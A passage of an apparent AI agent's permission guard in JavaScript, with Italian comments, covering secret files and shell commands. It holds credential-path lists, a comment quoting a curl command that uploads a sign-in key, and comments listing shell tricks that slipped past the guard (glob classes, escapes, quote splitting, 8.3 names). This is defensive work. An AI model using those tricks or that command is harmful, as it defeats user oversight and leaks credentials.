  const normalizzato = conLaHomeEspansa(grezzo, home);
  if (normalizzato === '' || normalizzato.includes('://') || normalizzato.startsWith('//')) return null;
  const assolutoScritto = /^[A-Za-z]:\//u.test(normalizzato) || normalizzato.startsWith('/');
  const conCartella = typeof cartella === 'string' && cartella !== '' && !eDiRete(cartella);
  /* Senza radice un percorso relativo non si controlla (il ponte del telefono): lo stesso limite, dichiarato, di `esempioConUnaChiave`. */
  if (!assolutoScritto && !conCartella) return null;
  const fs = fsSync?.lstatSync ? fsSync : { lstatSync: lstatSyncNativa, readlinkSync: readlinkSyncNativa };
  try {
    const assoluto = assolutoScritto ? risolvi(normalizzato) : risolvi(cartella, normalizzato);
    /*
     * ⛔ RETE-10: prima di ogni `stat` il percorso VERO a parole (`lstat`/`readlink`, mai aperto): un collegamento verso una
     *   condivisione dà `null` e qui non si tocca niente — la domanda della rete viene prima.
     * ⛔ R6 (riverifica del bugfixer, banco da 1.000 risultati di ricerca in un `node_modules` stile pnpm: da ~15 ms a ~350 ms): il
     *   cammino a parole costava un `lstat` per OGNI pezzo del percorso, per ogni risultato. Ora la CARTELLA si cammina una volta
     *   (`memoria.veri`, viva quanto una ricerca) e il file con un `lstat` solo; un file che è esso stesso un collegamento si cammina
     *   per intero (raro).
     */
    const veri = (memoria.veri ??= new Map());
    const cartellaScritta = cartellaDi(assoluto);
    if (!veri.has(cartellaScritta)) veri.set(cartellaScritta, percorsoVeroAParole(cartellaScritta, fs));
    const cartellaVera = veri.get(cartellaScritta);
    if (cartellaVera === null) return null;
    if (cartellaVera === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
    let reale = join(cartellaVera, nomeBase(assoluto));
    const foglia = fs.lstatSync(reale);
    if (foglia.isSymbolicLink()) {
      reale = percorsoVeroAParole(reale, fs);
      if (reale === null) return null;
      if (reale === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
    }
    const info = statFn(reale, { bigint: true });
    /* R3 (revisione): `ino` 0 su certe unità (rete, FUSE, WebDAV) farebbe di ogni file con due nomi «il .env»; R4: un file vuoto non ha
       niente da rivelare (e il magazzino di pnpm fa di tutti i file vuoti uguali lo STESSO file). */
    if (!info.isFile() || info.nlink < 2n || info.ino === 0n || info.size === 0n) return null;
    const stessoFile = (altro) => {
      try { const i = statFn(altro, { bigint: true }); return i.isFile() && i.dev === info.dev && i.ino === info.ino; } catch { return false; }
    };
    const confronta = (x) => (process.platform === 'win32' ? x.toLowerCase() : x);
    const stessoNome = (altro) => { const c = confronta(risolvi(altro)); return c === confronta(assoluto) || c === confronta(reale); };
    /* la cartella del file (anche quella VERA, R2: un collegamento simbolico verso un hard link di un `.env` che sta altrove) e la
       radice del progetto: i nomi segreti di quel livello */
    const cartelle = [...new Set([cartellaDi(assoluto), cartellaDi(reale), ...(conCartella ? [risolvi(cartella)] : [])])];
    for (const dir of cartelle) {
      for (const nome of segretiDellaCartella(dir, { home, elencaFn, memoria })) {
        const candidato = join(dir, nome);
        if (stessoNome(candidato)) continue;
        if (stessoFile(candidato)) return { classe: classeDelPezzo(nome, home), percorso: `${grezzo} = ${candidato}` };
      }
    }
    /* la casa: le identità delle sue credenziali, calcolate una volta per chiamata (R1: per una ricerca, una volta per ricerca) */
    if (typeof home === 'string' && home !== '') {
      const trovato = identitaDellaCasa(home, { statFn, elencaFn, memoria }).get(`${info.dev}:${info.ino}`);
      if (trovato && !stessoNome(trovato)) return { classe: classeDelPezzo(trovato.replace(/\\/gu, '/'), home) ?? 'segreto', percorso: `${grezzo} = ${trovato}` };
    }
    return null;
  } catch {
    return null;
  }
}

/* R1 + riverifica (16/10 notte): la memoria vive quanto UNA ricerca (`senzaFileSegreti` passa la sua a `eUnFileSegreto`), mai globale a
   tempo: una memoria a 2 s lasciava invisibile per 2 s un hard link appena creato (HL-RV-01). Le altre porte (leggi, scrivi, la shell)
   ricevono una memoria nuova a ogni chiamata, cioè leggono sempre il disco vero (0,7 ms per un file con due nomi). */
function segretiDellaCartella(dir, { home, elencaFn, memoria }) {
  const cartelle = (memoria.cartelle ??= new Map());
  if (cartelle.has(dir)) return cartelle.get(dir);
  let nomi = [];
  try { nomi = elencaFn(dir).filter((nome) => classeDelPezzo(nome, home)); } catch { nomi = []; }
  cartelle.set(dir, nomi);
  return nomi;
}
function identitaDellaCasa(home, { statFn, elencaFn, memoria }) {
  const case_ = (memoria.case ??= new Map());
  if (case_.has(home)) return case_.get(home);
  const mappa = new Map();
  const nomiDi = (dir) => { try { return elencaFn(dir); } catch { return []; } };
  const candidati = [
    ...CREDENZIALI_DELLA_CASA.file.map((n) => join(home, n)),
    ...CREDENZIALI_DELLA_CASA.cartelle.flatMap((c) => nomiDi(join(home, ...c.split('/'))).map((n) => join(home, ...c.split('/'), n))),
  ];
  for (const candidato of candidati) {
    try {
      const i = statFn(candidato, { bigint: true });
      if (i.isFile() && i.ino !== 0n && i.size !== 0n) mappa.set(`${i.dev}:${i.ino}`, candidato);
    } catch { /* non c'è: niente da confrontare */ }
  }
  case_.set(home, mappa);
  return mappa;
}

const LETTURE = new Set(['leggi', 'elenca']);
/* Owner 16/10/2026 sera («Chiedi, ma non in Full access»): scrivere o modificare un segreto del progetto chiede come leggerlo. */
const SCRITTURE = new Set(['scrivi', 'file_edit']);

/*
 * ⭐ K4b (03/10/2026, owner «ogni singola parola nella app deve essere sia in inglese che in italiano»): la frase per la persona
 *   è INGLESE (la sorgente) e viaggia con la sua chiave del dizionario (area `server` del frontend) e i suoi valori; la carta
 *   d'approvazione la dice nella lingua dell'interfaccia (`testoDelCampo`). Le chiavi sono LETTERALI, una per combinazione
 *   classe×attrezzo: il cancello K4A-S02 le confronta col dizionario. `fuori-workspace` esiste solo per le letture.
 */
const CHIAVI_DELLA_FRASE = Object.freeze({
  'portachiavi|leggi': 'server.approval.read.keychain',
  'portachiavi|elenca': 'server.approval.list.keychain',
  'portachiavi|shell': 'server.approval.command.keychain',
  'segreto|leggi': 'server.approval.read.secret',
  'segreto|elenca': 'server.approval.list.secret',
  'segreto|shell': 'server.approval.command.secret',
  'segreto|scrivi': 'server.approval.write.secret',
  'portachiavi|scrivi': 'server.approval.write.keychain',
  'fuori-workspace|leggi': 'server.approval.read.outside',
  'fuori-workspace|elenca': 'server.approval.list.outside',
  'fuori-workspace-nascosto|leggi': 'server.approval.read.hiddenOutside',
  'fuori-workspace-nascosto|elenca': 'server.approval.list.hiddenOutside',
  'fuori-workspace-nascosto|shell': 'server.approval.command.hiddenOutside',
  // 14/10/2026: un file d'esempio che dentro ha una chiave vera (`esempioConUnaChiave`): segreto come gli altri, la frase dice perché
  'esempio-con-chiave|leggi': 'server.approval.read.exampleWithKey',
  'esempio-con-chiave|shell': 'server.approval.command.exampleWithKey',
  /* blocco dopo (punti 2 e 3, 04/11/2026): il PERCHÉ della carta vince sulla classe, quando c'è. Il comando dei biglietti diceva «un file che può contenere chiavi
     (biglietto-talos)», un nome tecnico a schermo; un tetto della guardia diceva lo stesso. Ora la carta dice che cosa il comando può fare, o che non si è potuto
     controllare. Il `percorso` resta quello di prima; la chiave del consenso porta anche il perché, decisione 107, `chiaveDelConsensoDi` (fonti: `FONTI-GUARDIA-BLOCCO-DOPO-2026-11-04.md`, B1-B5). */
  'biglietti|shell': 'server.approval.command.signInLink',
  'troppo-complesso|shell': 'server.approval.command.tooComplex',
});
const FRASI_INGLESI = Object.freeze({
  'server.approval.read.keychain': "This read opens the system keychain, where passwords are kept: do you want me to do it?",
  'server.approval.list.keychain': "This listing opens the system keychain, where passwords are kept: do you want me to do it?",
  'server.approval.command.keychain': "The command opens the system keychain, where passwords are kept: do you want me to run it?",
  'server.approval.read.secret': "This read opens a file that may contain keys or passwords ({percorso}): do you want me to do it?",
  'server.approval.read.exampleWithKey': "This read opens an example file that holds something that looks like a real key ({percorso}): do you want me to do it?",
  'server.approval.command.exampleWithKey': "The command touches an example file that holds something that looks like a real key ({percorso}): do you want me to run it?",
  'server.approval.list.secret': "This listing opens a file that may contain keys or passwords ({percorso}): do you want me to do it?",
  'server.approval.command.secret': "The command touches a file that may contain keys or passwords ({percorso}): do you want me to run it?",
  'server.approval.write.secret': "This write changes a file that may contain keys or passwords ({percorso}): do you want me to do it?",
  'server.approval.write.keychain': "This write changes the system keychain, where passwords are kept: do you want me to do it?",
  'server.approval.read.outside': "This read opens a file outside the working folder ({percorso}): do you want me to do it?",
  'server.approval.list.outside': "This listing opens a folder outside the working folder ({percorso}): do you want me to do it?",
  'server.approval.read.hiddenOutside': "This read opens a hidden folder outside the working folder ({percorso}): do you want me to do it?",
  'server.approval.list.hiddenOutside': "This listing opens a hidden folder outside the working folder ({percorso}): do you want me to do it?",
  'server.approval.command.hiddenOutside': "The command touches a hidden folder outside the working folder ({percorso}): do you want me to run it?",
  'server.approval.command.signInLink': "The command can create a sign-in link to this app, or read the key that makes those links, and whoever holds one gets in as you: do you want me to run it?",
  'server.approval.command.tooComplex': "The command is too complex for me to check what it reads: do you want me to run it?",
});

/** La copia per la persona: lingua naturale, nessun nome tecnico, e DICE quale file. Inglese + chiave + valori (K4b). */
function frasePerLaPersona(segnalazione, tipo) {
  const tipoDellaFrase = tipo === 'leggi' || tipo === 'elenca' ? tipo : SCRITTURE.has(tipo) ? 'scrivi' : 'shell';
  const perIlPerche = segnalazione.perche ? CHIAVI_DELLA_FRASE[`${segnalazione.perche}|${tipoDellaFrase}`] : undefined;
  const fraseChiave = perIlPerche ?? CHIAVI_DELLA_FRASE[`${segnalazione.contenuto === true ? 'esempio-con-chiave' : segnalazione.classe}|${tipoDellaFrase}`];
  if (fraseChiave) {
    const fraseParams = { percorso: segnalazione.percorso };
    /* ⛔ sostituzione con FUNZIONE: un percorso con `$&` o `$1` non deve diventare un'altra frase (lezione del 02/09) */
    return { frase: FRASI_INGLESI[fraseChiave].replace('{percorso}', () => segnalazione.percorso), fraseChiave, fraseParams };
  }
  return { frase: fraseDiRiserva(segnalazione, tipo) };
}

/** Una classe che la tabella non conosce (non dovrebbe esistere): la frase di prima, in inglese (K4b), mai una frase vuota. */
function fraseDiRiserva(segnalazione, tipo) {
  const azione = tipo === 'leggi'
    ? { soggetto: 'This read opens', coda: 'do you want me to do it?' }
    : SCRITTURE.has(tipo)
      ? { soggetto: 'This write changes', coda: 'do you want me to do it?' }
    : tipo === 'elenca'
      ? { soggetto: 'This listing opens', coda: 'do you want me to do it?' }
      : { soggetto: 'The command touches', coda: 'do you want me to run it?' };
  if (segnalazione.classe === 'portachiavi') {
    const apre = tipo === 'leggi' ? 'This read opens' : tipo === 'elenca' ? 'This listing opens' : SCRITTURE.has(tipo) ? 'This write changes' : 'The command opens';
    return `${apre} the system keychain, where passwords are kept: ${azione.coda}`;
  }
  const cosa = segnalazione.classe === 'segreto'
    ? 'a file that may contain keys or passwords'
    : segnalazione.classe === 'fuori-workspace'
      ? (tipo === 'elenca' ? 'a folder outside the working folder' : 'a file outside the working folder')
      : 'a hidden folder outside the working folder';
  return `${azione.soggetto} ${cosa} (${segnalazione.percorso}): ${azione.coda}`;
}

/**
 * ⛔⛔⛔⛔ F15 — LA DOMANDA UNICA, quella che il kernel chiama: questo comando (o questa
 * lettura) va sottoposto alla persona ANCHE se l'attrezzo è impostato a «sempre»?
 *
 * ⛔ È una funzione PURA e l'unica porta: il kernel non deve rifare nessuna di queste
 * decisioni, e chiunque voglia provarle non ha bisogno di avviare una sessione.
 * ⛔ Torna `null` quando non c'è niente da chiedere — e `null` significa «il comportamento di
 * oggi, bit per bit»: questo modulo non nega mai niente e non consente mai niente, decide
 * soltanto se vale la pena disturbare la persona.
 *
 * @returns {null | {classe: string, percorso: string, frase: string}}
 */
/*
 * ⛔ Owner 16/10/2026 notte («No, separati»): il sì «Consenti questo percorso per la sessione» dato per LEGGERE un segreto non vale
 *   per SCRIVERLO — come Claude Code, dove `Read(.env)` ed `Edit(.env)` sono regole diverse.
 * ⛔ Decisione 107 dell'owner (03/11/2026 sera, «Un sì per ogni motivo»): il sì vale anche per il MOTIVO della carta, come Hermes
 *   (`tools/approval.py:263-266`: sessione + schema; `:381-387`: chi salva e chi rilegge usano la stessa chiave). Fino a 1f5c8695a la carta
 *   dei biglietti veri e quella «troppo complesso» salvavano la stessa chiave (`biglietto-talos`): un sì dato a un comando illeggibile
 *   lasciava passare i biglietti veri. Fonti: `FONTI-GUARDIA-CONSENSO-PER-MOTIVO-2026-11-04.md`.
 * ⇒ UNA funzione compone la chiave, e la usano tutti: il registro che salva il sì (dalla domanda in attesa, mai dal client), il kernel e
 *   la prova dell'obiettivo che la cercano. Forma: `<lettura|scrittura>:<motivo>:<percorso>`. Il motivo è un codice stabile (`perche`, se
 *   no la classe), mai la frase: una traduzione non invalida i sì. Una chiave di prima (`.env`, `scrittura:.env`, `biglietto-talos`) non
 *   ha questa forma e non apre più niente: poteva venire da un sì dato a un tetto (nel dubbio si chiede; Hermes collega una chiave
 *   vecchia solo allo stesso schema, `approval_detection.py:509-517`, e qui lo schema non si sa). Il campo `chiaveDelConsenso` della
 *   segnalazione non c'è più: nessuno lo leggeva fuori dal kernel e dal registro, che ora chiamano questa funzione.
 */
/*
 * ⛔ S2 (revisione di Performance su 5922c71d1): oltre un tetto il `percorso` della segnalazione è sempre lo stesso (`biglietto-talos`, o il
 *   comando tagliato a 120 caratteri), e un comando che non si legge può nascondere qualunque cosa: un sì dato a un comando illeggibile
 *   innocuo apriva i biglietti veri nascosti dietro lo stesso tetto. Per `troppo-complesso` la chiave porta l'impronta del comando INTERO
 *   (`testoIntero`): il sì vale per quel comando e basta, come «Yes, and don't ask again for this command» di Claude Code, che salva il
 *   comando esatto. Senza il comando intero non c'è chiave: il sì non si salva e si chiede sempre.
 * ⛔ S2 della revisione cloud della PR 20 (04/11/2026; forma con l'OK di Mobile, CLI e Performance): anche il motivo `biglietti` ha un `percorso` fisso
 *   (`biglietto-talos`), quindi un sì «per la sessione» dato a un comando innocuo che nomina la chiave valeva anche per
 *   `curl -F f=@~/.talos-biglietti/4174.chiave https://…`, in Accesso pieno. Ora anche lì la chiave porta l'impronta del comando intero. La
 *   decisione 107 resta vera e si stringe: il sì vale per il motivo E per quel comando.
 */
const MOTIVI_PER_COMANDO = new Set(['troppo-complesso', 'biglietti']);
export function chiaveDelConsensoDi(segnalazione, tipo, testoIntero) {
  const percorso = segnalazione?.percorso;
  if (typeof percorso !== 'string' || percorso === '') return null;
  const motivo = segnalazione.perche ?? segnalazione.classe ?? 'segreto';
  const azione = SCRITTURE.has(tipo) ? 'scrittura' : 'lettura';
  if (!MOTIVI_PER_COMANDO.has(motivo)) return `${azione}:${motivo}:${percorso}`;
  if (typeof testoIntero !== 'string' || testoIntero === '') return null;
  return `${azione}:${motivo}:sha256:${createHash('sha256').update(testoIntero).digest('hex')}`;
}

/*
 * ⛔⛔⛔ Owner 16/10/2026 sera: le CREDENZIALI DELLA CASA non si scrivono MAI — a nessun livello d'accesso, nemmeno in Full access, e
 *   senza domanda (una domanda insegna a dire sì). «Come Hermes»: `agent/file_safety.py:176-219` (clone hermes-agent-2026-10-07)
 *   nega per sempre `~/.ssh/authorized_keys`, `id_rsa`, `id_ed25519`, `.netrc`, `.pgpass`, `.npmrc`, `.pypirc`, `.git-credentials`
 *   e tutto ciò che sta sotto `.ssh`, `.aws`, `.gnupg`, `.kube`, `.docker`, `.azure`, `.config/gh`, `.config/gcloud`; e lascia
 *   `~/.ssh/config` alla domanda (`:231-239`: niente chiavi dentro, si modifica spesso). Qui uguale: `.ssh/config` chiede come gli
 *   altri segreti (non in Full access). `_netrc` è il nome di Windows dello stesso file.
 * ⛔ Sul percorso REALE (un collegamento verso `~/.ssh` non lo aggira) e senza lo stream di NTFS (K1). Un percorso che non si risolve
 *   si giudica com'è scritto: mai un'eccezione da un cancello.
 */
export const CREDENZIALI_DELLA_CASA = Object.freeze({
  file: Object.freeze(['.netrc', '_netrc', '.pgpass', '.npmrc', '.pypirc', '.git-credentials']),
  /* `.talos-biglietti` («gettone sempre», 02/11/2026): la chiave dei biglietti d'ingresso (`scripts/biglietto-talos.mjs`). Chi la legge entra nel server come la persona. */
  cartelle: Object.freeze(['.ssh', '.aws', '.gnupg', '.kube', '.docker', '.azure', '.config/gh', '.config/gcloud', '.talos-biglietti']),
  chiedono: Object.freeze(['.ssh/config']),
});

/*
 * ⛔ «Gettone sempre» (02/11/2026, condizione del Tester e punto aperto del Desktop): il comando dei biglietti stampa un ingresso nel server, quindi vale come
 *   leggere la sua chiave. Chiede anche in Full access. ⛔ Revisione R4: è ATTRITO sul testo, non un confine. Copre le forme normali: virgolette, `cd ~` e poi il nome
 *   relativo, `tar`, `find`, gli asterischi (N7 della seconda revisione: anche quelli corti, come `bi*.mjs` o una cartella `.t*`). NON copre un nome costruito pezzo per pezzo dentro un
 *   programma (`node -e "…'/.talos-'+'biglietti'…"`), né chi copia il comando sotto un altro nome: ricadono fra i programmi dello stesso utente coi pieni poteri (`src/gettone.mjs`).
 */
const COMANDO_DEI_BIGLIETTI = /(?:^|[^a-z0-9])biglietto-talos(?:\.mjs)?(?:$|[^a-z0-9])/iu;
/*
 * ⛔ S5 della revisione cloud della PR 20 (04/11/2026): `\.chiave` dopo un nome qualunque prendeva anche le parole del codice (`fuoriDalProgetto.chiave`, 57 volte in 27
 *   file nostri), e un `grep` comune chiedeva la carta anche in Accesso pieno. La chiave dei biglietti ha UN nome: `<porta>.chiave` (`scripts/biglietto-talos.mjs:22-24`).
 *   Si riconosce allora la cartella, oppure un nome di file la cui radice può essere una porta: dopo l'ultimo separatore (`/`, `\`, `=`, `@`, `:`, `,`, `;`) niente
 *   lettere fuori dalle classi, cioè cifre, jolly, `?`, `*` o classi (`4174.chiave`, `*.chiave`, `$P.chiave`, `f=@4174.chiave`). Come Hermes, che riconosce un percorso
 *   sensibile dal NOME del file e non da una parola nel testo (`agent/file_safety.py:176-219`).
 */
const CHIAVE_DEI_BIGLIETTI = /\.talos-biglietti/iu;
const NOME_DELLA_CHIAVE = /(?:^|[/\\=@:,;])([^/\\=@:,;]*)\.chiave(?=$|[^a-z0-9])/giu;
/** La radice di un nome `<radice>.chiave` può essere una porta? Niente lettere fuori dalle classi `[..]`, e almeno un carattere. */
function radiceDaPorta(radice) {
  const fuoriDalleClassi = radice.replace(/\[[^\]]*\]/gu, '0');
  return fuoriDalleClassi !== '' && !/[a-z]/iu.test(fuoriDalleClassi);
}
function nominaLaChiave(parola) {
  for (const m of parola.matchAll(NOME_DELLA_CHIAVE)) if (radiceDaPorta(m[1])) return true;
  return false;
}
const NOMI_DEL_COMANDO = Object.freeze(['biglietto-talos.mjs', 'biglietto-talos']);

/*
 * ⛔ N11 della quarta revisione (03/11/2026 sera): la guardia era una lista di nomi, e la shell riscrive il testo DOPO che la guardia l'ha letto (la classe GuardFall,
 *   Adversa/CSA 30/06/2026; «One Goal, Many Commands», arXiv 2606.15549). `[a-c]iglietto`, `[!x]`, `[[:alpha:]]`, `{b..b}`, `b$'\x69'glietto`, `b${X:-i}glietto` passavano.
 *   La cura non allunga la lista: si legge il comando come lo legge la shell, parola per parola, con lo stesso lettore del controllo dei segreti (`paroleDellaShell`:
 *   apici e barre tolti, `$'..'` decodificato, ogni sostituzione che il testo non dice diventa il jolly), le graffe espanse (`espandiGraffe`), una sequenza `{a..b}`
 *   scritta per esteso come fa bash, o il jolly se non si può (`formeDellaParola`, dai buchi della guardia), le classi `[..]` come classi (`combaciatoreDelSegmento`). Poi ogni parola si confronta coi nomi COME UN GLOB: se può voler dire il comando, la
 *   cartella o la chiave, si chiede. Nel dubbio si chiede, anche se il lettore lancia. È il principio di Claude Code (2.1.317: un nodo che non si può verificare prima
 *   è «too-complex» e chiede), di Codex (`shell-command/src/bash.rs:260-273`, `is_literal_word_or_number`: una parola con `{}*?[]\~^#$` o apici inversi non è una prova del nome vero) e di OpenCode («opaque»).
 * ⛔ Il tetto delle interruzioni: perché una parola chieda servono lettere scritte che portino al nome. Il comando: almeno una lettera sua prima di `.mjs` (o due classi);
 *   la chiave: almeno tre lettere o classi nell'estensione (`*.c*` resta libero); la cartella: un nome nascosto come prima (N7), oppure quattro lettere o classi. Misurato
 *   su dieci comandi tipici: zero carte prima, zero dopo (`CURE-N11-G1-2026-11-03.md`).
 * ⛔ RESTA FUORI, detto: una parola fatta SOLO di sostituzioni (`node "$S"`, `node $(cat nome)`): il testo non dice niente e chiedere lì vorrebbe dire chiedere a ogni
 *   `node "$FILE"`. Restano fuori anche `eval`, un nome costruito dentro un programma (`node -e "…'/.talos-'+'biglietti'…"`) e un comando copiato sotto un altro nome.
 *   Una variabile assegnata prima e usata DENTRO una parola con lettere sue (`f=igliett; node b${f}o-talos.mjs`) invece chiede: il jolly copre qualunque valore.
 *   È attrito sul testo, non un confine: il confine è altrove (`src/gettone.mjs`).
 */
/*
 * ⛔ Buchi della guardia (revisione di Performance, 03/11/2026 notte; `BUCHI-GUARDIA-2026-11-04.md`, fonti `FONTI-BUCHI-GUARDIA-2026-11-04.md`):
 *   - F1 (S2): `bash -c "node bigl''ietto-talos.mjs"`. Nella lettura appiattita gli apici SEPARAVANO le parole (`bigl` + `ietto-talos.mjs`), mentre la shell che
 *     rilegge il testo li toglie e le unisce. Due cure: (a) il codice annidato si rilegge DAVVERO come un comando, con le stesse letture, come fa già il controllo dei
 *     segreti e come fanno Hermes (`tools/approval_detection.py:993-1020`, il carico di `-c` diventa una variante a sé) e Continue (`evaluateTerminalCommandSecurity.ts:
 *     245-256`, le sostituzioni si valutano di nuovo): `$(..)`, apici inversi, `bash -c`, `powershell -c`, `cmd /c`, `iex`; (b) una quarta lettura con gli apici TOLTI,
 *     non sostituiti, come la normalizzazione di Hermes (`approval_detection.py:536-538`, `r''m → rm`): copre chi rilegge un testo senza che lo riconosciamo come
 *     interprete (`ssh casa '…'`, `su -c '…'`, `watch '…'`).
 *   - F2 (S2): le variabili di cmd valgono il jolly nella lettura di cmd e PowerShell (`variabiliDiCmd`, vedi `VARIABILE_DI_CMD`).
 *   - S3: le sequenze `{x..y}` si scrivono per esteso (`formeDellaParola`), la stessa funzione del controllo dei segreti.
 *   Oltre quattro livelli di codice annidato, oltre `LETTURE_ANNIDATE.testi` testi o `LETTURE_ANNIDATE.caratteri` caratteri riletti, si chiede (il lettore lancia, e il
 *   cancello nel dubbio chiede).
 * ⛔ RESTA FUORI, detto (F3, S3): un nome COSTRUITO da un'espressione, come la concatenazione di PowerShell `node ("bigl"+"ietto-talos.mjs")`,
 *   `powershell -c "node ('bigl'+'ietto-talos.mjs')"` o `$n='bigl'+'ietto-talos.mjs'; node $n`. È il limite 2 qui sopra (un nome costruito dentro un programma): per
 *   leggerlo bisogna valutare l'espressione (Microsoft Learn, about_Arithmetic_Operators: `+` concatena le stringhe), cosa che fa un interprete, non un lettore di
 *   parole. Codex rifiuta per intero un comando PowerShell con un'espressione (`powershell_parser.ps1:118-150`: solo costanti, il resto è «unsupported»). È attrito,
 *   non un confine: il confine resta `src/gettone.mjs`.
 */
const LETTURE_ANNIDATE = Object.freeze({ profondita: 4, testi: 32, caratteri: 1_000_000 });
function paroleDaGiudicare(comando) {
  const parole = new Set();
  const speso = { testi: 0, caratteri: 0 };
  const leggi = (testo, profondita) => {
    /* Quattro letture. La barra rovescia come la toglie sh (`bigliett\o`) e come separatore di cmd e PowerShell (`$HOME\.talos-bigliett[h-j]\x`), dove valgono anche le
       variabili di cmd. La terza è «appiattita»: `$(`, apici e apici inversi separano le parole (le parentesi le separa già il lettore). La quarta toglie gli apici senza
       separare (F1). */
    const appiattito = testo.replace(/\$\(|[`'"]/gu, ' ');
    const senzaApici = testo.replace(/\$\(|`/gu, ' ').replace(/['"]/gu, '');
    /* una lettura uguale a una già fatta non dice niente di nuovo: la seconda cambia qualcosa solo con una `\` o una variabile di cmd, le altre solo con apici o `$(` */
    const letture = [[testo, false]];
    if (testo.includes('\\') || haVariabiliDiCmd(testo)) letture.push([testo, true]);
    if (appiattito !== testo) letture.push([appiattito, false]);
    if (senzaApici !== testo && senzaApici !== appiattito) letture.push([senzaApici, false]);
    const viste = new Set();
    for (const [testoDelComando, windows] of letture) {
      for (const { testo: scritta } of paroleDellaShell(testoDelComando, { barraDiWindows: windows, variabiliDiCmd: windows })) {
        if (viste.has(scritta)) continue;
        viste.add(scritta);
        const { parole: forme, troppe, testo: parola } = formeDellaParola(scritta);
        for (const forma of forme) parole.add(forma);
        /* oltre il tetto delle forme ogni graffa rimasta vale il jolly: un insieme più largo, mai più stretto */
        if (troppe) {
          let largo = parola;
          while (/\{[^{}]*\}/u.test(largo)) largo = largo.replace(/\{[^{}]*\}/gu, JOLLY);
          parole.add(largo);
        }
      }
    }
    /* F1: il codice annidato che la shell esegue, riletto come un comando a sé.
       ⛔ S6 della revisione cloud della PR 20 (04/11/2026): il corpo di un heredoc col delimitatore fra virgolette (`cat > f <<'EOF'`) è testo, la shell non
       ci esegue né `$(..)` né apici inversi (bash, «Here Documents»: «If any part of word is quoted … the lines in the here-document are not expanded»). Contarli
       faceva scattare «troppo complesso» per un README con 33 apici inversi. Come la guardia dei segreti (`nominaUnSegretoPerGlob`), le sostituzioni si cercano
       senza quei corpi; le PAROLE del corpo si leggono ancora qui sopra (un `node <<'EOF'` è un programma, Hermes `approval_detection.py:1010-1011`). */
    const senzaCorpi = senzaCorpiDiHeredoc(testo);
    const interpreti = comandiDegliInterpreti(senzaCorpi);
    if (interpreti.troppi) throw new Error('troppi interpreti annidati');
    for (const interno of [...sostituzioniDiComando(senzaCorpi), ...interpreti]) {
      speso.testi += 1;
      speso.caratteri += interno.length;
      if (profondita >= LETTURE_ANNIDATE.profondita || speso.testi > LETTURE_ANNIDATE.testi || speso.caratteri > LETTURE_ANNIDATE.caratteri) throw new Error('codice annidato oltre il tetto');
      leggi(interno, profondita + 1);
    }
  };
  leggi(comando, 0);
  return parole;
}
/** Le lettere scritte in un nome, fuori dalle classi, e le classi che stringono (`[b]`, `[a-c]`; non `[!x]`): quanto il nome dice di sé. */
function lettereScritte(nome) {
  let lettere = 0;
  let classi = 0;
  for (let i = 0; i < nome.length; i += 1) {
    if (nome[i] === '[') {
      const classe = traduciClasse(nome, i);
      if (classe) { if (!classe.regex.startsWith('[^')) classi += 1; i = classe.fine; continue; }
    }
    if (/[a-z0-9]/iu.test(nome[i])) lettere += 1;
  }
  return { lettere, classi };
}
/*
 * ⛔ Blocco dopo (punto 4, 04/11/2026): il NOME CORTO 8.3 di Windows. `BIGLIE~1.MJS` apre `biglietto-talos.mjs`, `TALOS-~1` la cartella `.talos-biglietti`,
 *   `4174~1.CHI` la chiave `4174.chiave`, e nessuno dei tre somiglia al nome lungo. Si riconosce dalla FORMA, senza leggere il disco (la corrispondenza vera non si
 *   può calcolare: dipende dall'ordine in cui i file sono nati, Microsoft Learn «Naming Files», `RtlGenerate8dot3Name`): una radice di 1-8 caratteri, `~`, un numero,
 *   un'estensione di al più tre, otto caratteri in tutto prima del punto. Chiede se la radice è l'inizio del nome lungo pulito (`BIGLIETTO-TALOS`, `TALOS-BIGLIETTI`:
 *   il punto iniziale cade) o la forma col riassunto (due lettere + quattro cifre esadecimali), e l'estensione è l'inizio di `MJS` (o manca); per la chiave basta
 *   l'estensione `CHI` nell'ultimo nome. Restano liberi `HEAD~1`, `PROGRA~1`, `DOCUME~1`, `RUNNER~1` (misurati, GR-22). ⛔ Resta fuori, detto: il nome corto dei
 *   SEGRETI (`.env`, `id_rsa`…) nel controllo dei segreti, che è un'altra lista e un altro giudizio; e un nome corto scritto con un jolly (`BIGL*~1.MJS`).
 */
const NOME_CORTO_8_3 = /^([^~.\s/]{1,8})~(\d{1,6})(?:\.([^.~\s/]{0,3}))?$/u;
function nomeCortoDeiBiglietti(nome, ultimo) {
  const m = NOME_CORTO_8_3.exec(nome);
  if (!m || m[1].length + 1 + m[2].length > 8) return false;
  const radice = m[1].toUpperCase();
  const estensione = (m[3] ?? '').toUpperCase();
  const daNome = (lungo) => (radice.length >= 2 && lungo.startsWith(radice)) || (radice.length === 6 && /^[0-9A-F]{4}$/u.test(radice.slice(2)) && lungo.startsWith(radice.slice(0, 2)));
  if (daNome('BIGLIETTO-TALOS') && 'MJS'.startsWith(estensione)) return 'comando';
  if (daNome('TALOS-BIGLIETTI') && estensione === '') return 'cartella';
  return ultimo && estensione === 'CHI' ? 'chiave' : false;
}
// La cartella delle chiavi scritta con un glob (`~/.talos-b*`, `~/.t*` seguito da un nome, `.talos-bigliett[i]`): quanto basta perché non sia un nome qualunque.
function globDellaCartellaDeiBiglietti(nomi) {
  /* `.*` da solo come ultimo nome è «tutti i file nascosti qui» e lo nomina già il controllo dei segreti (`c005-glob-sui-nomi-segreti`, GL-3) */
  return nomi.some((nome, i) => {
    if (!eUnGlob(nome) || !combaciatoreDelSegmento(nome, true)('.talos-biglietti')) return false;
    const sue = lettereScritte(nome);
    return nome.startsWith('.') ? i < nomi.length - 1 || sue.lettere >= 1 : sue.lettere + sue.classi >= 4;
  });
}
/*
 * ⛔ Decisione 155 dell'owner (04/11/2026, aggiornamento 17:02 del brief): in Accesso pieno la guardia dei biglietti si divide. Il NOME del
 *   comando, le parole `<porta>.chiave` e «troppo complesso» non fanno carte; la CARTELLA `~/.talos-biglietti` è una credenziale di casa
 *   (sta in `CREDENZIALI_DELLA_CASA.cartelle`), e leggerla resta la carta della 161 in ogni sua grafia della shell: per intero, con un glob,
 *   col nome corto 8.3 (`TALOS-~1`). Come Claude Code in `bypassPermissions`, che chiede ancora davanti a ciò che resta protetto
 *   (code.claude.com/docs/en/permission-modes, letta il 04/11/2026), e come Hermes, che riconosce un percorso sensibile dal NOME della
